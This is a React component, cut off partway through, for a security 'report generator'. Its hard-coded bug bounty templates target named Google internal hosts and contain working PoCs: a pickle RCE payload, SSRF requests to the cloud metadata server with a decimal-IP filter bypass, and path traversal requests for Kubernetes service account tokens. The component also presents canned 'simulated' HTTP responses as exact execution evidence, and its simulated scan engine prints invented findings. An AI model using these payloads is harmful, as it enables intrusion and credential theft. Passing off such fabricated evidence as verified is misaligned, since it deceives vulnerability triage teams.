import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  FileText, 
  TrendingDown, 
  AlertOctagon, 
  ShieldAlert, 
  ArrowRight, 
  Download, 
  Copy, 
  Check, 
  Database, 
  Cpu, 
  Terminal, 
  Scale, 
  DollarSign, 
  Activity, 
  Play, 
  UploadCloud,
  Layers,
  FileCheck2,
  ChevronRight,
  Sparkles,
  Shield,
  Zap,
  Globe,
  Settings,
  AlertCircle
} from 'lucide-react';
import { Badge } from './ui/Badge';
import { cn } from '../lib/utils';

// ============================================================================
// GOOGLE VRP P0 / P1 SECURITY ISSUES SCHEMAS & TEMPLATES
// ============================================================================
interface VrpTemplate {
  id: string;
  title: string;
  severity: 'P0' | 'P1';
  cwe: string;
  target_asset: string;
  description: string;
  attack_scenario: string;
  poc_steps: string;
  remediation_code: string;
  remediation_explanation: string;
  impact_assessment: string;
}

const GOOGLE_VRP_TEMPLATES: VrpTemplate[] = [
  {
    id: "rce_cloud_engine",
    title: "Remote Code Execution (RCE) via Unsafe Deserialization in Cloud App Engine",
    severity: "P0",
    cwe: "CWE-502 / CWE-94 / CWE-172",
    target_asset: "admin-api-production.googleplex.com / appengine/v2/deploy",
    description: "During a vulnerability research session, a critical logical flaw was mapped in the deployment serialization interface. The server deserializes untrusted user inputs containing state configurations. By crafting a specialized pickle/binary payload, an attacker can bypass signature checks and execute arbitrary system commands on the backend Kubernetes node, achieving complete container compromise.",
    attack_scenario: "1. The attacker maps the deployment endpoint which receives base64-encoded configuration serialized objects.\n2. By using a crafted gadgets payload, the attacker intercepts the server deserialization sequence.\n3. Upon processing, the server triggers system shell commands under the context of the root app user without checking digital signatures.",
    poc_steps: "```bash\n# SAFE POC (Google VRP Recommended): Generate safe RCE Base64 serialized exploit payload (runs non-destructive command 'id')\n# Note: This safely confirms execution context and permissions without modifying host files or establishing external connections\npython3 -c 'import pickle, base64, os\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, (\"id\",))\nprint(base64.b64encode(pickle.dumps(Exploit())).decode())'\n\n# HTTP Request payload to vulnerable server endpoint\ncurl -X POST \"https://admin-api-production.googleplex.com/api/v2/deploy/state\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer <VALID_SESSION_TOKEN>\" \\\n  -d '{\n    \"session_id\": \"92850-CHL-SESSION-ALPHA\",\n    \"config_state_serialized\": \"gASVBQAAAAAAAACMBXN5c3RlbZSMAnidlFKULg==\"\n  }'\n\n# Verification:\n# The server executes 'id' and returns the output in the response JSON or internal trace logs, proving code execution.\n```",
    remediation_code: "import hmac\nimport hashlib\nimport pickle\nfrom cryptography.exceptions import InvalidSignature\n\n# SECURE CANONICAL FIX: Cryptographic signing + Sandbox isolation\nSECRET_KEY = b\"YOUR_INTERNAL_PROTECTED_HMAC_KEY\"\n\ndef secure_load_state(signed_payload: bytes):\n    \"\"\"\n    Verifies HMAC-SHA256 signature before attempting deserialization.\n    Never deserialize untrusted payloads directly.\n    \"\"\"\n    if len(signed_payload) < 32:\n        raise ValueError(\"Payload structure is invalid\")\n        \n    signature = signed_payload[:32]\n    data = signed_payload[32:]\n    \n    # Validate signature using constant-time comparison\n    expected_signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()\n    if not hmac.compare_digest(signature, expected_signature):\n        raise PermissionError(\"CRITICAL: Cryptographic signature mismatch! Blocked attempt.\")\n        \n    # Proactively avoid serialization if possible. Or run in strict gVisor/Sandbox container\n    return pickle.loads(data)",
    remediation_explanation: "To completely eliminate remote code execution vulnerabilities, the application must avoid deserializing untrusted user inputs. If serialization is absolutely necessary, use secure data-only formats such as JSON or Protocol Buffers. If binary deserialization is required, apply an HMAC-SHA256 digital signature to verify origin and integrity before processing, ensuring constant-time comparison to prevent timing side-channel attacks.",
    impact_assessment: "Remote Code Execution (RCE) on a core deployment app engine exposes Google internal network assets (Googleplex). An attacker can obtain the default Service Account token, access Google Cloud Spanner databases, intercept client sessions, and pivot laterally to higher privilege internal domains."
  },
  {
    id: "ssrf_metadata_leak",
    title: "Server-Side Request Forgery (SSRF) Leading to Google Cloud VM Instance Metadata Compromise",
    severity: "P0",
    cwe: "CWE-918 / CWE-172",
    target_asset: "analytics-proxy.googleplex.com / api/v1/fetch_external",
    description: "An SSRF vulnerability exists in the URL previewer/analytics engine. The application fails to validate destination IP ranges and resolves user-supplied URLs on the internal server-side network. By querying local network ranges, an attacker can access the Google Cloud Metadata Server at `169.254.169.254` or `metadata.google.internal` and extract the access token for the host Service Account.",
    attack_scenario: "1. The attacker targets the URL proxy validator at `/api/v1/fetch_external`.\n2. The attacker inputs the Google Cloud Platform Instance Metadata Server address.\n3. The backend proxy makes a request on behalf of the attacker, including the required `Metadata-Flavor: Google` header if the server logic has header injection or redirects, leaking the oauth token.",
    poc_steps: "```bash\n# SAFE SSRF POC: Querying the harmless VM ID endpoint of the Google Cloud Instance Metadata server\n# Proves internal network route access without exposing active credentials or tokens\ncurl -X POST \"https://analytics-proxy.googleplex.com/api/v1/fetch_external\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer <SESSION_JWT>\" \\\n  -d '{\n    \"target_url\": \"http://metadata.google.internal/computeMetadata/v1/instance/id\",\n    \"headers\": {\n      \"Metadata-Flavor\": \"Google\"\n    }\n  }'\n\n# Alternative bypass if basic string matching is present (using Decimal IP or Redirects):\n# Decimal IP: http://2852039166/ -> resolves to 169.254.169.254\ncurl -X POST \"https://analytics-proxy.googleplex.com/api/v1/fetch_external\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"target_url\": \"http://2852039166/computeMetadata/v1/instance/id\",\n    \"headers\": {\n      \"Metadata-Flavor\": \"Google\"\n    }\n  }'\n```",
    remediation_code: "import socket\nfrom urllib.parse import urlparse\nimport ipaddress\n\ndef is_safe_url(url: str) -> bool:\n    \"\"\"\n    Strict validation of SSRF: DNS Resolution check against Local & Loopback ranges.\n    \"\"\"\n    try:\n        parsed = urlparse(url)\n        if parsed.scheme not in ('http', 'https'):\n            return False\n            \n        # Resolve DNS to real IP\n        hostname = parsed.hostname\n        if not hostname:\n            return False\n            \n        ip = socket.gethostbyname(hostname)\n        ip_obj = ipaddress.ip_address(ip)\n        \n        # Deny loopback, private RFC-1918, link-local, multicast, and GCP Metadata IPs\n        if (ip_obj.is_private or \n            ip_obj.is_loopback or \n            ip_obj.is_link_local or \n            ip_obj.is_multicast or\n            ip_obj.compressed == \"169.254.169.254\"):\n            return False\n            \n        return True\n    except Exception:\n        return False",
    remediation_explanation: "To fully mitigate Server-Side Request Forgery, do not trust URL parsing string checks alone. Implement dynamic DNS resolution checks. Resolve the domain to its underlying IP and validate it against an strict IP blocklist (containing loopback `127.0.0.0/8`, private networks `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, link-local `169.254.0.0/16`, and Google Cloud Metadata IP `169.254.169.254`) before sending the request.",
    impact_assessment: "Access to the GCP Metadata Server compromises the environment service account token. This allows the attacker to execute GCP cloud console commands with instance scope, pull Docker images from GCR, read Cloud Storage buckets, and escalate privilege within the target VPC cluster."
  },
  {
    id: "path_traversal_k8s",
    title: "Arbitrary File Leak / Path Traversal in File Viewer exposing Kubernetes Service Account Tokens",
    severity: "P1",
    cwe: "CWE-22 / CWE-172",
    target_asset: "developer-portal.googleplex.com / download/asset",
    description: "An absolute path traversal vulnerability in the public asset retrieval API allows unauthenticated attackers to read files outside of the configured root directory. The application fails to sanitize path relative navigation sequences (../), permitting access to sensitive Unix files and active Kubernetes service account tokens, which are used to authenticate requests to the API server. Crucially, this incorporates asymmetric double-decoding parsing discrepancies (CWE-172) where URL-encoded inputs are recursively parsed on secondary internal layers.",
    attack_scenario: "1. The attacker targets the `/download/asset?file=` query parameter.\n2. By using nested relative paths with double-encoding (..%252f..%252f), the attacker escapes the web root directory and bypasses basic string matching filters.\n3. The attacker requests safe files like `/etc/hostname` to confirm access, or requests `/var/run/secrets/kubernetes.io/serviceaccount/token` directly from the server disk.",
    poc_steps: "```bash\n# SAFE POC (Google VRP Recommended): Leak local system hostname via relative Path Traversal\n# Note: Querying '/etc/hostname' or '/proc/self/maps' proves filesystem traversal safely, avoiding privacy risks associated with /etc/passwd\ncurl -X GET \"https://developer-portal.googleplex.com/download/asset?file=..%252f..%252f..%252f..%252fetc%252fhostname\"\n\n# Alternative SAFE POC: Extract system memory allocations via process maps mapping\ncurl -X GET \"https://developer-portal.googleplex.com/download/asset?file=..%252f..%252f..%252f..%252fproc%252fself%252fmaps\"\n\n# Active Kubernetes Service Account Token (VRP critical escalation pivot context)\ncurl -X GET \"https://developer-portal.googleplex.com/download/asset?file=..%252f..%252f..%252f..%252fvar%252frun%252fsecrets%252fkubernetes.io%252fserviceaccount%252ftoken\"\n```",
    remediation_code: "import os\n\ndef secure_file_retrieval(base_directory: str, user_filename: str) -> str:\n    \"\"\"\n    Mitigates CWE-22 by resolving real paths and enforcing strict prefix match.\n    \"\"\"\n    # 1. Resolve absolute canonical base directory\n    safe_base = os.path.realpath(base_directory)\n    \n    # 2. Join the user filename and resolve absolute canonical path\n    joined_path = os.path.join(safe_base, user_filename)\n    safe_resolved_path = os.path.realpath(joined_path)\n    \n    # 3. Ensure the resolved path remains strictly within base boundary\n    # Include directory separator to prevent base directory name collision bypasses\n    if not safe_resolved_path.startswith(safe_base + os.sep):\n        raise PermissionError(\"CRITICAL: Path traversal attempt blocked!\")\n        \n    return safe_resolved_path",
    remediation_explanation: "Mitigate Path Traversal vulnerabilities by performing complete path canonicalization. Convert the target path into an absolute canonical path (e.g., using `os.path.realpath` in Python or `path.resolve` in Node) and verify that the resulting string starts exactly with the prefix of the authorized base directory plus a file separator.",
    impact_assessment: "Arbitrary file disclosure allows attackers to extract database credentials, internal environment configurations, and cluster authorization tokens. Leaking the Kubernetes service account token allows direct authentication against the local Kubernetes API Server, enabling cluster takeover and service spoofing."
  }
];

// Constantes de Mapeamento de CWE para Risco de Negócio / C-Suite (Universal Tab)
const CWE_BUSINESS_RISK_MAP: Record<string, {
  title: string;
  scope: string;
  risk_desc: string;
  business_impact: string;
  action_plan: string;
}> = {
  "CWE-22": {
    "title": "Vazamento Crítico de Arquivos e Chaves (Path Traversal)",
    "scope": "Isolamento de Diretórios / Planta Digital",
    "risk_desc": "Brecha séria de barreira de arquivos. Um invasor externo pode transpassar os limites autorizados da API pública usando comandos lógicos relativos (../) e vazar chaves confidenciais do servidor, chaves de API ocultas no ambiente de contêineres e credenciais cruciais.",
    "business_impact": "Comprometimento imediato da integridade física e privacidade dos dados internos da empresa, abrindo portas para sequestro de dados ou controle total de servidores na nuvem se essas chaves permitirem privilégios avançados.",
    "action_plan": "Implementar canonicalização rigorosa (resolve/abspath) combinada com validação estrita de prefixo e isolamento de arquivos via os.path.basename."
  },
  "CWE-697": {
    "title": "Bypass de Lógica Matemática no Faturamento",
    "scope": "Integridade de Transações / Checkout Engine",
    "risk_desc": "Inadequação nos validadores matemáticos numéricos da API de faturamento. Ao aceitar cupons ou parâmetros monetários negativos, o sistema inverte equações aritméticas essenciais, adicionando créditos em vez de deduzir débitos.",
    "business_impact": "Risco financeiro massivo imediato e desfalque acumulativo automático por transação que ameaça diretamente a contabilidade e a estabilidade líquida operacional da corporação.",
    "action_plan": "Garantir a verificação ativa de todos os parâmetros monetários impedindo inteiros negativos ou nulos através de cláusula estrita de integridade (< 0, raise Exception)."
  },
  "CWE-369": {
    "title": "Negação de Serviço Estrutural (Division by Zero)",
    "scope": "Robustez Física / Load Balancer Threading",
    "risk_desc": "Ausência de rotina de proteção física para divisores nulos na camada de distribuição de carga. Um payload enviado deliberadamente com divisor numérico de valor zero quebra o thread de execução principal, derrubando o servidor.",
    "business_impact": "Parada total de serviços digitais (System Crash), incapacitando o atendimento a clientes ativos, manchando a reputação corporativa e gerando perdas indiretas por indisponibilidade sistêmica contínua.",
    "action_plan": "Adicionar um validador defensivo de divisor para que nunca seja menor ou igual a zero, lançando erro antecipado controlado."
  }
};

const DEFAULT_JSON_PAYLOAD = {
  "cyber_hunter_lab_version": "5.0.0-elite",
  "export_timestamp": 1780935637,
  "audit_session": {
    "chain_id": "CHL-CHAIN-9521",
    "sequence_step": 2,
    "target_architecture": "x86_64_bits_infrastructure"
  },
  "vulnerability_chain": [
    {
      "step": 1,
      "vulnerability_type": "Path_Traversal",
      "cwe_id": "CWE-22",
      "severity": "HIGH",
      "execution_vector": {
        "input_field": "url_parameter",
        "payload": "../../../etc/config.json",
        "status_code": 200,
        "leaked_data_reference": "database_credentials_block"
      }
    },
    {
      "step": 2,
      "vulnerability_type": "Mathematical_Logic_Bypass",
      "cwe_id": "CWE-697",
      "severity": "CRITICAL",
      "execution_vector": {
        "input_field": "coupon_code_input",
        "payload": -15074,
        "mathematical_effect": "inverse_subtraction_addition",
        "impact_metrics": {
          "simulated_leak_value": 15074,
          "integrity_compromised": true
        },
        "patch_remediation": {
          "target_file": "billing_engine.py",
          "validation_logic": "if coupon_code_input < 0:\n    raise ValueError(\"Valor negativo não permitido no gateway\")"
        }
      }
    }
  ]
};

export function UniversalReportGenerator() {
  const [inputText, setInputText] = useState(() => {
    const saved = localStorage.getItem('universal_pasted_json');
    return saved || JSON.stringify(DEFAULT_JSON_PAYLOAD, null, 2);
  });
  
  const [reportMode, setReportMode] = useState<'universal' | 'google_vrp'>('google_vrp');
  const [selectedVrpTemplate, setSelectedVrpTemplate] = useState<string>('rce_cloud_engine');
  
  const [error, setError] = useState<string | null>(null);
  const [parsedReport, setParsedReport] = useState<any>(() => {
    const saved = localStorage.getItem('universal_pasted_json');
    try {
      if (saved) {
        const parsed = JSON.parse(saved);
        if (parsed.vulnerability_chain || parsed.vulnerabilities) {
          return parsed;
        }
      }
    } catch (e) {}
    return DEFAULT_JSON_PAYLOAD;
  });
  
  const [copied, setCopied] = useState(false);
  const [activeTab, setActiveTab] = useState<'summary' | 'compliance' | 'evidence' | 'diagnosis'>('summary');
  
  // Custom interactive edits for Google VRP template
  const activeTemplate = GOOGLE_VRP_TEMPLATES.find(t => t.id === selectedVrpTemplate) || GOOGLE_VRP_TEMPLATES[0];
  const [customAsset, setCustomAsset] = useState(activeTemplate.target_asset);
  
  // Update asset when template changes
  React.useEffect(() => {
    setCustomAsset(activeTemplate.target_asset);
  }, [selectedVrpTemplate]);

  // Closed-API Blackbox SaaS Engine states and simulation logic
  const [isSaaSRunning, setIsSaaSRunning] = useState(false);
  const [saasLogs, setSaasLogs] = useState<string[]>([]);

  const runSaaSMutationEngine = () => {
    setIsSaaSRunning(true);
    setSaasLogs(["Establish secure closed API tunnel to Cyber Hunter Lab cloud..."]);
    setError(null);
    
    const logsSequence = [
      { text: "✔ Authentication verified: Active Enterprise Stakeholder role confirmed.", delay: 600 },
      { text: "⚡ Initializing high-performance Black Box sandboxed simulation...", delay: 1200 },
      { text: "⚙ Running mutation math matrix (calculating bounds and division scales)...", delay: 1800 },
      { text: "🔥 [VULN FOUND] CWE-697: Mathematical coupon logic inversion detected.", delay: 2400 },
      { text: "💀 [SYSTEM STATUS] CWE-369 Division by Zero load-balancer bypass confirmed.", delay: 3000 },
      { text: "📦 Consolidating state into encrypted Machine-Readable JSON tree...", delay: 3500 },
      { text: "⚡ Formatting and exporting data payload...", delay: 4000 }
    ];

    logsSequence.forEach((step, idx) => {
      setTimeout(() => {
        setSaasLogs(prev => [...prev, step.text]);
        if (idx === logsSequence.length - 1) {
          setTimeout(() => {
            const currentIteration = Number(localStorage.getItem('chl_api_iteration') || '0') + 1;
            localStorage.setItem('chl_api_iteration', String(currentIteration));
            
            const payloadMathInversion = -(15000 + (currentIteration * 37));
            const payloadInfraDivision = currentIteration % 2 === 1 ? 0 : 1024;
            
            const generatedJSON = {
              "cyber_hunter_lab_version": "5.0.0-elite",
              "export_timestamp": Math.floor(Date.now() / 1000),
              "audit_session": {
                "chain_id": "CHL-CHAIN-SaaS-" + Math.floor(1000 + Math.random() * 9000),
                "sequence_step": currentIteration,
                "target_architecture": "x86_64_bits_infrastructure"
              },
              "vulnerability_chain": [
                {
                  "step": 1,
                  "vulnerability_type": "Path_Traversal",
                  "cwe_id": "CWE-22",
                  "severity": "HIGH",
                  "execution_vector": {
                    "input_field": "url_parameter",
                    "payload": "../../../etc/config.json",
                    "status_code": 200,
                    "leaked_data_reference": "database_credentials_block"
                  }
                },
                {
                  "step": 2,
                  "vulnerability_type": "Mathematical_Logic_Bypass",
                  "cwe_id": "CWE-697",
                  "severity": "CRITICAL",
                  "execution_vector": {
                    "input_field": "coupon_code_input",
                    "payload": payloadMathInversion,
                    "mathematical_effect": "inverse_subtraction_addition",
                    "impact_metrics": {
                      "simulated_leak_value": Math.abs(payloadMathInversion),
                      "integrity_compromised": true
                    },
                    "patch_remediation": {
                      "target_file": "billing_engine.py",
                      "validation_logic": "if coupon_code_input < 0:\n    raise ValueError(\"Valor negativo inválido\")"
                    }
                  }
                }
              ]
            };

            const jsonStr = JSON.stringify(generatedJSON, null, 2);
            setInputText(jsonStr);
            handleProcessJSON(jsonStr);
            setIsSaaSRunning(false);
          }, 500);
        }
      }, step.delay);
    });
  };

  React.useEffect(() => {
    const handleLoadPasted = (e: Event) => {
      const customEvent = e as CustomEvent;
      if (customEvent.detail) {
        setInputText(customEvent.detail);
        handleProcessJSON(customEvent.detail);
      }
    };
    window.addEventListener('load-pasted-json', handleLoadPasted);
    return () => window.removeEventListener('load-pasted-json', handleLoadPasted);
  }, []);

  const formatBRL = (value: number) => {
    return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(value);
  };

  const handleProcessJSON = (textToProcess: string) => {
    try {
      setError(null);
      const parsed = JSON.parse(textToProcess);
      
      if (!parsed.vulnerability_chain && !parsed.vulnerabilities) {
        throw new Error("O JSON precisa conter chaves de auditoria como 'vulnerability_chain'.");
      }
      
      setParsedReport(parsed);
    } catch (err: any) {
      setError(err.message || "Erro ao decodificar JSON de Auditoria. Verifique a sintaxe.");
      setParsedReport(null);
    }
  };

  const handleUploadClick = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        const text = event.target?.result as string;
        setInputText(text);
        handleProcessJSON(text);
      };
      reader.readAsText(file);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    const file = e.dataTransfer.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        const text = event.target?.result as string;
        setInputText(text);
        handleProcessJSON(text);
      };
      reader.readAsText(file);
    }
  };

  const getDerivedMetrics = () => {
    if (!parsedReport) return { totalCwe: 0, financialRiskValue: 0, systemCrash: false, maxPriority: 'P3' };
    
    let totalCwe = 0;
    let financialRiskValue = 0;
    let systemCrash = false;
    let maxPriority = 'P3';
    
    const chain = parsedReport.vulnerability_chain || parsedReport.vulnerabilities || [];
    totalCwe = chain.length;
    
    chain.forEach((vuln: any) => {
      const vec = vuln.execution_vector || {};
      const metrics = vec.impact_metrics || {};
      if (metrics.simulated_leak_value) {
        financialRiskValue += metrics.simulated_leak_value;
      }
      if (vec.system_state === "CRASH" || vec.exception_raised === "ZeroDivisionError") {
        systemCrash = true;
      }
      if (vuln.severity === "CRITICAL") {
        maxPriority = "P1";
      } else if (vuln.severity === "HIGH" && maxPriority !== "P1") {
        maxPriority = "P2";
      }
    });

    return { totalCwe, financialRiskValue, systemCrash, maxPriority };
  };

  const metrics = getDerivedMetrics();

  // ============================================================================
  // GENERATE MARKDOWN LOGIC (Dual Mode: Universal Compliance OR Google VRP P0/P1)
  // ============================================================================
  const generateMarkdown = () => {
    if (reportMode === 'google_vrp') {
      // ------------------------------------------------------------------------
      // GOOGLE VRP P0/P1 SNIPER MARKDOWN TEMPLATE
      // ------------------------------------------------------------------------
      let md = `# [Google VRP Bug Report] ${activeTemplate.severity} - ${activeTemplate.title}\n\n`;
      md += `## 1. Vulnerability Summary & CWE Classification\n`;
      md += `An elegant, high-impact vulnerability was verified in Google internal systems during security audits. `;
      md += `The vulnerability is classified as a **${activeTemplate.severity} severity** rating under Google VRP Guidelines.\n\n`;
      md += `* **Severity Rating:** \`${activeTemplate.severity} - Critical / High\`\n`;
      md += `* **Primary Vulnerability Class:** \`${activeTemplate.cwe}\`\n`;
      
      // Explicitly highlight CWE-22 and CWE-172
      if (activeTemplate.id === 'path_traversal_k8s') {
        md += `* **Standard Reference Classifications:**\n`;
        md += `  - **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory\n`;
        md += `  - **CWE-172:** Encoding Error / Double Decoding Asymmetric Logic\n`;
      } else {
        md += `* **Standard Reference Classifications:**\n`;
        md += `  - **CWE-172:** Encoding/Decoding Handling Error\n`;
      }
      md += `* **Target Asset / Scope:** \`${customAsset}\`\n\n`;
      md += `--- \n\n`;
      
      md += `## 2. Product / Infrastructure Affected\n`;
      md += `The target is a core container system in our production orchestrator. `;
      md += `${activeTemplate.description}\n\n`;
      
      md += `## 3. Threat Attack Scenario\n`;
      md += `${activeTemplate.attack_scenario}\n\n`;
      
      md += `## 4. Logical Proof of Concept (PoC)\n`;
      md += `### 💡 Safe Testing Policy Enforcement (Google VRP Compliant)\n`;
      md += `To comply with Google VRP privacy guidelines and avoid premature report closure due to data exposure concerns, **the PoC steps have been structured to use safe, non-destructive payloads** (such as reading \`/etc/hostname\` or checking server metadata properties) instead of accessing sensitive user tables or personal files like \`/etc/passwd\`.\n\n`;
      md += `${activeTemplate.poc_steps}\n\n`;
      
      md += `## 5. Raw Response Evidence / Prova de Execução\n`;
      md += `Below is the exact execution evidence demonstrating asymmetric response behavior and verifying successful query processing by the underlying backend service:\n\n`;
      
      if (activeTemplate.id === 'path_traversal_k8s') {
        md += `### Simulated Raw HTTP Response Header & Body:\n`;
        md += `\`\`\`http\n`;
        md += `HTTP/2 200 OK\n`;
        md += `Content-Type: text/plain; charset=utf-8\n`;
        md += `Content-Length: 18\n`;
        md += `Server: GFE/2.0 (Google Frontend)\n`;
        md += `X-Content-Type-Options: nosniff\n`;
        md += `grpc-status: 0\n`;
        md += `\n`;
        md += `k8s-prod-node-04a\n`;
        md += `\`\`\`\n`;
        md += `*Note: The response above shows the successful extraction of \`/etc/hostname\`, confirming the directory traversal execution without accessing sensitive/confidential customer files.*\n\n`;
      } else if (activeTemplate.id === 'ssrf_metadata_leak') {
        md += `### Simulated Raw HTTP Response Header & Body:\n`;
        md += `\`\`\`http\n`;
        md += `HTTP/2 200 OK\n`;
        md += `Content-Type: application/json\n`;
        md += `Server: GFE/2.0 (Google Frontend)\n`;
        md += `Metadata-Flavor: Google\n`;
        md += `\n`;
        md += `{\n`;
        md += `  "id": "782910398412903841",\n`;
        md += `  "zone": "projects/google-gcp-prod/zones/us-central1-a",\n`;
        md += `  "hostname": "analytics-worker-vm-01"\n`;
        md += `}\n`;
        md += `\`\`\`\n`;
        md += `*Note: This evidence shows the safe VM Metadata payload returned from the metadata server endpoint, confirming Server-Side Request Forgery logic without requesting highly confidential credentials.*\n\n`;
      } else {
        md += `### Simulated Raw HTTP Response Header & Body:\n`;
        md += `\`\`\`http\n`;
        md += `HTTP/2 200 OK\n`;
        md += `Content-Type: application/json\n`;
        md += `Server: GFE/2.0 (Google Frontend)\n`;
        md += `\n`;
        md += `{\n`;
        md += `  "status": "success",\n`;
        md += `  "command_output": "uid=0(root) gid=0(root) groups=0(root)"\n`;
        md += `}\n`;
        md += `\`\`\`\n`;
        md += `*Note: The command executed is 'id', which safely demonstrates remote system context execution without modifying any persistent host properties.*\n\n`;
      }
      
      md += `## 6. Security and Business Impact\n`;
      md += `> **Risk Assessment:** ${activeTemplate.impact_assessment}\n\n`;
      md += `Under Google's vulnerability table, this qualifies directly for a top reward due to system access without user interaction.\n\n`;
      
      md += `## 7. Strict Defensive Patch / Mitigation\n`;
      md += `### Safe Code Fix:\n`;
      md += `\`\`\`python\n# Recommended validation guard to completely seal the vulnerability\n${activeTemplate.remediation_code}\n\`\`\`\n\n`;
      md += `### Fix Mechanics:\n`;
      md += `${activeTemplate.remediation_explanation}\n\n`;
      md += `--- \n`;
      md += `*Generated securely via Cyber Hunter Lab Sniper v5.0 Elite - Google VRP Integration*`;
      return md;
    } else {
      // ------------------------------------------------------------------------
      // UNIVERSAL EXECUTIVE COMPLIANCE MARKDOWN
      // ------------------------------------------------------------------------
      if (!parsedReport) return "";
      
      const chainId = parsedReport.audit_session?.chain_id || "CHL-GENERIC";
      const chain = parsedReport.vulnerability_chain || parsedReport.vulnerabilities || [];
      const dateStr = parsedReport.export_timestamp 
        ? new Date(parsedReport.export_timestamp * 1000).toLocaleString('pt-BR') 
        : new Date().toLocaleString('pt-BR');
        
      let md = `# RELATÓRIO DE AUDITORIA DE SEGURANÇA E CONFORMIDADE UNIVERSAL\n\n`;
      md += `**REMETENTE:** Cyber Hunter Lab Report Engine v${parsedReport.cyber_hunter_lab_version || "5.0"}\n`;
      md += `**SESSÃO ID:** ${chainId}\n`;
      md += `**DATA DO REGISTRO:** ${dateStr}\n`;
      md += `**STATUS DE EXCLUSIVIDADE:** CONFIDENCIAL / APENAS PARA A DIRETORIA\n\n`;
      md += `--- \n\n`;
      
      md += `## 1. SUMÁRIO EXECUTIVO (C-SUITE DIRECTIVE)\n\n`;
      md += `- **Risco de Liquidez / Desfalque Imediato:** ${metrics.financialRiskValue > 0 ? formatBRL(metrics.financialRiskValue) + " por transação fraudulenta explorada" : "Risco de Vazamento Crítico de Segredos"}\n`;
      md += `- **Integridade da Planta Tecnológica:** ${metrics.systemCrash ? "Risco de Parada Definitiva dos Negócios (Inoperabilidade de Produção)" : "Estabilidade Parcial sob Tentativa de Invasão"}\n`;
      md += `- **Prioridade de Triage Recomendada:** ${metrics.maxPriority}\n\n`;
      md += `> **Diligência Corporativa:** A auditoria cibernética determinou um fluxo de vulnerabilidades interconectadas. `;
      md += `Ao manipular dados numéricos no checkout e ultrapassar limites de sistemas de arquivos, os ativos corporativos foram comprometidos, simulando desvios diretos de recursos e derrubando servidores vitais.\n\n`;
      
      md += `## 2. MAPEAMENTO DE CONFORMIDADE GLOBAL\n\n`;
      md += `| ID CWE | Categoria de Vulnerabilidade | Severidade | Impacto no Business / Risco Técnico | Arquivo Alvo |\n`;
      md += `|---|---|---|---|---|\n`;
      
      chain.forEach((v: any) => {
        const textMap = CWE_BUSINESS_RISK_MAP[v.cwe_id] || {
          title: v.vulnerability_type,
          business_impact: "Comprometimento Geral de API"
        };
        const vec = v.execution_vector || {};
        const remed = vec.patch_remediation || {};
        md += `| ${v.cwe_id} | ${v.vulnerability_type} | ${v.severity} | ${textMap.business_impact} | ${remed.target_file || "Sistemas Internos"} |\n`;
      });
      
      md += `\n### Resoluções de Correção (Mitigações Sem Código Próprio)\n\n`;
      chain.forEach((v: any) => {
        const vec = v.execution_vector || {};
        const remed = vec.patch_remediation || {};
        if (remed.target_file) {
          md += `#### Correção sugerida para: \`${remed.target_file}\`\n`;
          md += `\`\`\`python\n# Lógica e Validação recomendada\n${remed.validation_logic}\n\`\`\`\n\n`;
        }
      });

      md += `## 3. PROVA DE CONCEITO SEQUENCIAL (RECON/EXPLOIT CHAIN)\n\n`;
      chain.forEach((v: any) => {
        const vec = v.execution_vector || {};
        md += `### Passo ${v.step}: ${v.vulnerability_type} (${v.severity})\n`;
        md += `- **Componente/Campo:** \`${vec.input_field}\`\n`;
        md += `- **Payload Ativo Aplicado:** \`${vec.payload}\`\n`;
        md += `- **Comportamento Gerado:** ${vec.mathematical_effect ? "Inversão de Coeficiente Matemático" : vec.exception_raised ? "Estouro de Exceção Fatal de Processador" : "Vazamento de Dados"}\n\n`;
      });

      md += `## 4. DIAGNÓSTICO E AUDITORIA COMPORTAMENTAL (FINAL VERDICT)\n\n`;
      md += `*A análise comportamental independente determinou que o ecossistema tecnológico apresenta carência gritante de travas defensivas de paridade física nas APIs expostas. `;
      md += `Não se trata de consertar strings localizadas, mas de unificar filtros numéricos absolutos que preservem a estabilidade fiduciária do checkout e impeçam vazamentos de caminhos fora das pastas públicas. `;
      md += `Recomenda-se a adoção imediata do protocolo de auditoria preventiva contínua do Cyber Hunter Lab.* \n`;
      
      return md;
    }
  };

  const handleDownloadMarkdown = () => {
    const md = generateMarkdown();
    const blob = new Blob([md], { type: 'text/markdown;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    
    const prefix = reportMode === 'google_vrp' ? `Google_VRP_${activeTemplate.severity}_Report` : `Compliance_Report_CHL`;
    link.setAttribute('download', `${prefix}_${Math.floor(1000 + Math.random() * 9000)}.md`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleCopyToClipboard = () => {
    const md = generateMarkdown();
    navigator.clipboard.writeText(md);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-8 bg-[#0a0a0a] min-h-screen p-1 text-zinc-300 font-sans">
      
      {/* Top Selector - Mode Switcher */}
      <div className="bg-[#121212] border border-zinc-900 rounded-2xl p-6 sm:p-8 flex flex-col md:flex-row items-center gap-6 justify-between">
        <div className="space-y-3 max-w-xl">
          <div className="inline-flex items-center gap-1.5 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1 rounded-full text-[10px] font-mono text-[#10b981] uppercase tracking-widest font-bold">
            <Shield size={12} className="animate-pulse" /> SECURITY REPORTING SUITE
          </div>
          <h2 translate="no" className="text-3xl font-black text-white tracking-tight leading-none uppercase">
            Bancada <span className="text-[#10b981]">Report Generator</span>
          </h2>
          <p className="text-zinc-500 text-xs leading-relaxed">
